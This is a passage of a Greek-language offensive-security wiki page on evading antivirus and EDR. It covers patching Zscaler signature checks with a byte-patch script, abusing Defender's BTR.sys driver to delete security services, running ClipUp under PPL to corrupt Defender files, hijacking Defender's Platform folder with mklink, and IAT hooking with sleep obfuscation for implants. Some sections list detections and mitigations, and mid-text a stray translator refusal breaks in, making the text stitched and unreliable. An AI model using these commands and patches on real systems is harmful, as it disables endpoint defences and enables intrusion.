| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας του tunnel | Παρακάμπτονται |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση της στοίβας υπηρεσιών:

* **Όλοι** οι έλεγχοι κατάστασης εμφανίζουν **πράσινη/συμμορφούμενη** κατάσταση.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζεται από τις πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και απλοί έλεγχοι υπογραφής με μερικά byte patches.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Το πρόγραμμα οδήγησης **Boot-Time Removal** του Defender αποτελεί ένα χρήσιμο αντίθετο παράδειγμα του κλασικού BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς bug αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση διαχειριστή και `SeLoadDriverPrivilege`, ένας operator μπορεί αντ' αυτού να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασης και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/μητρώου στο Ring-0. Αυτό είναι ένα **primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι αρχική πρόσβαση ή κλιμάκωση προνομίων**, και το πρόγραμμα οδήγησης μπορεί να εξαχθεί από τον πόρο `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του στόχου αντί να εισαχθεί ένα εμφανές πρόγραμμα οδήγησης τρίτου μέρους.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot driver

Κανονικά, το Defender αποθηκεύει τον πόρο ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια υπηρεσία kernel με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της υπηρεσίας, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, καταγράφει feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε το πρόγραμμα οδήγησης να αποφορτωθεί αντί να παραμείνει στη μνήμη. Μια πλαστογραφημένη υπηρεσία έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Στα builds που αναλύθηκαν, επαναχρησιμοποιείται ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με τερματισμό null και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32 πολυωνύμου `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC μηδενίζεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά action ID εκθέτουν αυτά τα primitives του kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, συμπεριλαμβανομένου κλειδωμένου αρχείου |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο attacker· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, ο διαχωριστής κλειδιού/τιμής στο wire format είναι **δύο διαδοχικά backslash**· μια διαδρομή σε συμβατική μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, που δεν έχουν αρχικό πεδίο flags, το BTR μετατοπίζει τη διαδρομή στα τέσσερα δεσμευμένα byte στο τέλος, ώστε να δημιουργήσει χώρο για αυτή την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασιών `BTR_CLI` και παράθυρο πρώιμης εκκίνησης

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των streams `<random>.sys:changelist` και feedback, σειριοποίηση/υπολογισμό checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού registry της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για `-trigger boot`. Η απευθείας προετοιμασία του registry παρακάμπτει την κανονική διαδρομή SCM `CreateServiceW` και επομένως **δεν** δημιουργεί το Event ID 7045 για εγκατάσταση υπηρεσίας. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί I/O αρχείων από το `DriverEntry` πριν είναι έτοιμα η στοίβα αποθήκευσης και ο σύνδεσμος `SystemRoot`. Το `Start=1`, σε συνδυασμό με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender`, εκτελείται αντίθετα στη Phase 1: το NTFS είναι αξιοποιήσιμο, αλλά πολλά προγράμματα οδήγησης ασφαλείας που ξεκινούν από το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Τα φίλτρα boot-start, όπως το `WdFilter`, μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα δυαδικά αρχεία τους ή τη διαμόρφωση των υπηρεσιών τους πριν από την επόμενη εκκίνηση και να διαγράψει τα εκτελέσιμα αρχεία των υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση boot-start και φέρει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει στην αρχή την Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το αρχείο καταγραφής, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την εκφόρτωση. Αυτό μειώνει τα αποδεικτικά στοιχεία, ενώ η αποθήκευση των feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του προγράμματος οδήγησης και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις ανίχνευσης υψηλής σηματοδοτικής αξίας

Οι κανόνες που βασίζονται αποκλειστικά στις υπογραφές και η λίστα αποκλεισμού ευάλωτων προγραμμάτων οδήγησης της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συμπεριφορικές συσχετίσεις, διακρίνοντας παράλληλα τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** Η δημιουργία του `.sys:changelist` είναι καθολική στο BTR staging. Ένα ADS `.dat` προσαρτημένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, επειδή το νόμιμο Defender αποθηκεύει κανονικά τα feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>` που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender` με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού προγράμματος οδήγησης BTR από προέλευση εκτός Defender με επακόλουθη διαγραφή αρχείων που αποδίδεται στο `System`/PID 4, ιδιαίτερα όταν αφορά δυαδικά αρχεία ασφαλείας.
- **Sysmon 11 -> 23:** δημιουργήστε ειδοποίηση για την ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγχετε την ανάθεση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αποτελεί επαρκή λόγο εμπιστοσύνης όταν ένα πρόγραμμα οδήγησης εργαλείου ασφαλείας γίνεται staging από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για παραποίηση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία υπογραφών/επιπέδων, ώστε μόνο διεργασίες με ίδιο ή υψηλότερο επίπεδο προστασίας να μπορούν να παραποιούν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα δυαδικό αρχείο με ενεργοποιημένο PPL και να ελέγξετε τα ορίσματά του, μπορείτε να μετατρέψετε αβλαβή λειτουργικότητα (π.χ. καταγραφή) σε έναν περιορισμένο μηχανισμό εγγραφής, προστατευμένο από PPL, για καταλόγους που χρησιμοποιούνται από AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελείται μια διεργασία ως PPL
- Το EXE-στόχος (και κάθε DLL που φορτώνεται) πρέπει να είναι υπογεγραμμένο με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με το CreateProcess, χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στην υπογραφή του δυαδικού αρχείου (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για υπογραφές anti-malware, `PROTECTION_LEVEL_WINDOWS` για υπογραφές Windows). Η επιλογή λανθασμένου επιπέδου θα προκαλέσει αποτυχία δημιουργίας.

Δείτε επίσης εδώ μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει επίπεδο προστασίας και προωθεί τα ορίσματα στο EXE-στόχο):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Δεν μπορώ να μεταφράσω οδηγίες που περιγράφουν πώς να παρακάμψετε την προστασία PPL και να απενεργοποιήσετε το antivirus καταστρέφοντας αρχεία του. Μπορώ να βοηθήσω με μια μη επιχειρησιακή, αμυντική περίληψη στα ελληνικά.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείτε να ελέγξετε τα περιεχόμενα που γράφει το ClipUp, παρά μόνο τη θέση τους· το primitive ενδείκνυται για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα διαχειριστή/SYSTEM για εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Εντοπισμοί
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν η γονική διεργασία είναι μη τυπικός launcher, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες για αυτόματη εκκίνηση ύποπτων binary που ξεκινούν σταθερά πριν από το Defender/AV. Ερευνήστε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για binary/καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με προστατευμένα process flags.
- Τηλεμετρία ETW/EDR: αναζητήστε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binary που δεν σχετίζονται με AV.

Μετριασμός
- WDAC/Code Integrity: περιορίστε ποια υπογεγραμμένα binary μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· αποκλείστε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιορίστε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολουθήστε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιωθείτε ότι είναι ενεργοποιημένα τα tamper protection και early-launch protections του Defender· διερευνήστε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξετάστε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 σε τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον είναι συμβατό με το περιβάλλον σας (δοκιμάστε διεξοδικά).

## Παραποίηση του Microsoft Defender μέσω κατάληψης symlink του φακέλου έκδοσης Platform

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους του:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και στη συνέχεια εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας ανάλογα τις διαδρομές υπηρεσιών/μητρώου). Αυτή η επιλογή εμπιστεύεται τις εγγραφές καταλόγου, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας διαχειριστής μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από τον εισβολέα και να πετύχει DLL sideloading ή διακοπή της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός διαχειριστής (απαιτείται για τη δημιουργία καταλόγων/symlinks στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας από το Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας εμπιστεύεται τις εγγραφές καταλόγου και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφική τιμή χωρίς να επαληθεύει ότι ο προορισμός αντιστοιχεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοιμάστε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιούργησε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform, που να δείχνει στον φάκελό σου:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Θα πρέπει να παρατηρήσετε τη νέα διαδρομή της διεργασίας κάτω από το `C:\TMP\AV\` και τις ρυθμίσεις παραμέτρων της υπηρεσίας/το registry να αντικατοπτρίζουν αυτήν τη θέση.

Επιλογές μετά την εκμετάλλευση
- DLL sideloading/εκτέλεση κώδικα: Αποθέστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Τερματισμός υπηρεσίας/άρνηση υπηρεσίας: Καταργήστε το version-symlink, ώστε κατά την επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να αποτυγχάνει να εκκινηθεί:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι Red teams μπορούν να μεταφέρουν την runtime evasion από το C2 implant στην ίδια την ενότητα-στόχο, κάνοντας hooking στο Import Address Table (IAT) της και δρομολογώντας επιλεγμένα API μέσω attacker-controlled, position‑independent code (PIC). Αυτό γενικεύει την evasion πέρα από το μικρό σύνολο API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και επεκτείνει τις ίδιες προστασίες σε BOFs και post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Κάντε stage ένα PIC blob δίπλα στην ενότητα-στόχο χρησιμοποιώντας reflective loader (με πρόθεμα ή συνοδευτικό). Το PIC πρέπει να είναι αυτόνομο και position-independent.
- Καθώς φορτώνεται η host DLL, διατρέξτε το IMAGE_IMPORT_DESCRIPTOR της και κάντε patch στις εγγραφές IAT για τα imports-στόχους (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε thin PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν καλέσει με tail-call τη διεύθυνση του πραγματικού API. Οι συνήθεις evasions περιλαμβάνουν:
  - Mask/unmask μνήμης γύρω από την κλήση (π.χ., κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και, στη συνέχεια, επαναφορά μετά την κλήση.
  - Call-stack spoofing: κατασκευή ενός αβλαβούς stack και μετάβαση στο API-στόχο, ώστε η ανάλυση call-stack να εντοπίζει τα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για λόγους συμβατότητας, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή ισοδύναμο) να μπορεί να δηλώνει ποια API θα γίνονται hook για Beacon, BOFs και post‑ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί για κάθε κώδικα που χρησιμοποιεί το hooked import, χωρίς τροποποίηση του κώδικα του εργαλείου ή εξάρτηση από το Beacon για να κάνει proxy συγκεκριμένων API.
- Καλύπτει post‑ex DLLs: το hooking των LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση ενοτήτων (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε την ίδια evasion με masking/stack στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση post‑ex εντολών που δημιουργούν διεργασίες απέναντι σε detections που βασίζονται στο call-stack, κάνοντας wrapping στα CreateProcessA/W.

Βασικό σκελετό IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν hooking κατά το DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patch ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και αποφύγετε να αφήνετε σελίδες με δικαιώματα εγγραφής και εκτέλεσης.

Stub πλαστογράφησης call-stack
- Τα PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και στη συνέχεια κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγετε στα αναμενόμενα frames πριν από το API prologue.

Επιχειρησιακή ενσωμάτωση
- Τοποθετήστε τον reflective loader πριν από τα post-ex DLLs, ώστε τα PIC και hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρίσετε target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Θέματα detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε μη image PIC· ασυνεπής καταγωγή RtlUserThreadStart.
- Τηλεμετρία loader: writes εντός διεργασίας στην IAT, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, μη αναμενόμενες RX περιοχές που δημιουργούνται κατά τη φόρτωση.
- Αποφυγή image-load: αν γίνεται hooking του LoadLibrary*, παρακολουθήστε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα memory masking.

Σχετικά building blocks και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Hooks memory masking (π.χ. simplehook) και PIC stack-cutting (stackcutting)
- PIC stubs πλαστογράφησης call-stack (π.χ. Draugr)


## Hooking IAT κατά το Import + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks IAT κατά το import μέσω ενός resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hook στα imports **κατά τη διάρκεια** του `ProcessImports()` αντικαθιστώντας τον δείκτη `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού το transient loader PIC αποδεσμεύσει τη μνήμη του.
- Εξαγάγετε μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε αναζήτηση hook βάσει hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε το πραγματικό `GetProcAddress`.
- Καταχωρίστε τους στόχους hook κατά το link με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **ανακατεύθυνση IAT κατά το import** χωρίς patching του code section του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα hooks κατά το import ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), εξαναγκάστε ένα πραγματικό import, ώστε να περάσει από τη διαδρομή `ProcessImports()` του loader:

- Αντικαταστήστε την επίλυση hashed exports (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την interception όταν ο reflective loader επιλύει τα imports.

### Sleep/idle obfuscation τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνετε patch το `Sleep`, κάντε hook στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, περικλείστε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko που κρυπτογραφεί την εικόνα στη μνήμη κατά τη διάρκεια της αδράνειας:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ορισμός της εικόνας σε `PAGE_READWRITE` → κρυπτογράφηση RC4 μέσω `advapi32!SystemFunction032` σε ολόκληρη τη mapped image → εκτέλεση της blocking αναμονής → αποκρυπτογράφηση RC4 → **επαναφορά των δικαιωμάτων ανά section** με περιήγηση στα PE sections → σήμανση ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποιήστε το σε πολλαπλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να εκτελεστεί κάθε βήμα.

Λειτουργική λεπτομέρεια: επιστρέψτε «success» για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει ενώ η εικόνα είναι masked. Αυτό το μοτίβο αποκρύπτει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει την κλασική υπογραφή «patched `Sleep()`».

Ιδέες για detection (βάσει τηλεμετρίας)
- Ριπές από callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους εικόνας.
- `VirtualProtect` σε μεγάλο εύρος, ακολουθούμενο από προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε στόχους με ενεργοποιημένο CFG, το πρώτο έμμεσο jump σε gadget μέσα σε συνάρτηση, όπως `jmp [rbx]` ή `jmp rdi`, συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να συνεχίσουν να λειτουργούν οι αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε έμμεσο προορισμό που χρησιμοποιεί η αλυσίδα μέσω του `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το **image size**.
